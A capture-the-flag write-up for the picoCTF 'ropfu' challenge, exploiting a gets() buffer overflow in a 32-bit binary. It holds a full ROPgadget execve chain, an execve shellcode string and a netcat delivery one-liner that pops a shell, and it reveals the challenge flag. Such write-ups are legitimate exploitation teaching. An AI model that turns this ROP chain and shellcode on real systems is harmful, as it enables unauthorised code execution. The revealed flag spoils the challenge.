
# ropfu

Start with some basic file enumeration

```bash
file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=3aa2bb6a5bf44d90a355da83fa909bbf5d9d90ce, for GNU/Linux 3.2.0, not stripped
```

```bash
checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   2229 Symbols      No    0               0               vuln
```

Lastly, take a look at the source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}
```

There is a buffer overflow on line 12. Unlike previous challenges where you need to call an uncalled function, in this challenge you have to pop a shell in order to get the flag. 

To start you first need to find the offset to the return address.

```
gef➤  pattern create 150
[+] Generating a pattern of 150 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
[+] Saved as '$_gef1'
gef➤  r
Starting program: /home/Default/Documents/Repos/cerberus-bytes/Cerberus-bytes/CTF/Competition/picoCTF/pwn/ropfu/vuln 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0xf7ffc000'
How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
```

Output from gef

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcd60  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x61616166 ("faaa"?)
$ecx   : 0x80e5300  →  <_IO_2_1_stdin_+0> mov BYTE PTR [edx], ah
$edx   : 0xffffcdf6  →  0x00000000
$esp   : 0xffffcd80  →  "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"
$ebp   : 0x61616167 ("gaaa"?)
$esi   : 0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$edi   : 0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$eip   : 0x61616168 ("haaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcd80│+0x0000: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"    ← $esp
0xffffcd84│+0x0004: "jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]"
0xffffcd88│+0x0008: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
0xffffcd8c│+0x000c: "laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]"
0xffffcd90│+0x0010: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0xffffcd94│+0x0014: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaza[...]"
0xffffcd98│+0x0018: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabba[...]"
0xffffcd9c│+0x001c: "paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabca[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616168
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x61616168 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

Looking at the offset

```
gef➤  pattern search 0x61616168
[+] Searching for '0x61616168'
[+] Found at offset 28 (little-endian search) likely
[+] Found at offset 25 (big-endian search) 
gef➤  
```

Cool. Now there are two approaches: Auto exploit or manual exploit. To perform the automatic exploit, generate a rop-chain using ROPGadgets.

```bash
ROPgadget --binary vuln --ropchain

...
#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b''

p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
        p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b074a) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5064) # @ .data + 4
        p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b074a) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
        p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x08049e39) # pop ecx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
        p += pack('<I', 0x080e5060) # padding without overwrite ebx
p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0804a3d2) # int 0x80
```

You can use the auto generated code from `ROPgadget` to exploit this vulnerability. At the end of the code, insert

```python3
proc = remote("satern.picoctf.net", PORT)
proc.sendline(p)
proc.interactive()
```

However, I prefer the manual exploitation process. 

First, you need to find a ROPgadget to find where to jump. Ideally, you would like to jump directly to the stack. I was not able to find this instruction anywhere in the generated ROP gadgets. I did find `jmp eax` though.

```bash
cat ropgadget-results | grep "jmp eax"
...
0x0805334b : jmp eax
...
```

Taking a look at the state of `eax` before the return address

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcd60  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0x80e5300  →  <_IO_2_1_stdin_+0> mov BYTE PTR [edx], ah
$edx   : 0xffffcd80  →  0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$esp   : 0xffffcd80  →  0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$edi   : 0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcd80│+0x0000: 0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al       ← $esp
0xffffcd84│+0x0004: 0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
0xffffcd88│+0x0008: 0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
0xffffcd8c│+0x000c: 0x000003e9
0xffffcd90│+0x0010: 0xffffcdb0  →  0x00000001
0xffffcd94│+0x0014: 0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
0xffffcd98│+0x0018: 0x00000000
0xffffcd9c│+0x001c: 0x804a67d  →  <__libc_start_main+1309> add esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x42424242 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

`eax` actually points to the start of the input buffer. You can write the instruction for `jmp esp` at the beginning of your input buffer. I used an [online x86 assembler](https://defuse.ca/online-x86-assembler.htm#disassembly) to generate the op code: `\xff\xe4`.

So far, the payload looks like:

```
"\xff\xe4" + "A" * 26 + "\x4b\x33\x05\x08"
```

After jumping, you'll need a landing pad to deal with address randomization. I chose a NOP sled of 64 bytes and placed a breakpoint at the end for testing

```
"\xff\xe4" + "A" * 26 + "\x4b\x33\x05\x08" + "\x90" * 64 + "\xcc" * 4
```

Testing this out

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcd60  →  0x4141e4ff
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0x80e5300  →  <_IO_2_1_stdin_+0> mov BYTE PTR [eax], ah
$edx   : 0xffffcdc4  →  0x00000000
$esp   : 0xffffcd80  →  0x90909090
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$edi   : 0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$eip   : 0xffffcdc1  →  0x00cccccc
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcd80│+0x0000: 0x90909090   ← $esp
0xffffcd84│+0x0004: 0x90909090
0xffffcd88│+0x0008: 0x90909090
0xffffcd8c│+0x000c: 0x90909090
0xffffcd90│+0x0010: 0x90909090
0xffffcd94│+0x0014: 0x90909090
0xffffcd98│+0x0018: 0x90909090
0xffffcd9c│+0x001c: 0x90909090
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0xffffcdbe                  nop    
   0xffffcdbf                  nop    
   0xffffcdc0                  int3   
 → 0xffffcdc1                  int3   
   0xffffcdc2                  int3   
   0xffffcdc3                  int3   
   0xffffcdc4                  add    BYTE PTR [eax], al
   0xffffcdc6                  add    BYTE PTR [eax], al
   0xffffcdc8                  add    BYTE PTR [eax], al
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0xffffcdc1 in ?? (), reason: SIGTRAP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0xffffcdc1 → int3 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

I hit the SIGINT. All that's left to do is inject our shell-code. For quick and dirty shell-code I rip off [shell-storm](https://shell-storm.org/shellcode/files/shellcode-606.html) shellcode.

```
"\xff\xe4" + "A" * 26 + "\x4b\x33\x05\x08" + "\x90" * 64 + "\xcc" * 4 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
```

You can deliver this payload using a one-liner:

```bash
(python2.7 -c "print '\xff\xe4' + 'A' * 26 + '\x4b\x33\x05\x08' + '\x90' * 64 + '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'" ; cat) | nc saturn.picoctf.net 50428
```

Or implement it using pwntools like in main.py.

flag: `picoCTF{5n47ch_7h3_5h311_c6992ff0}`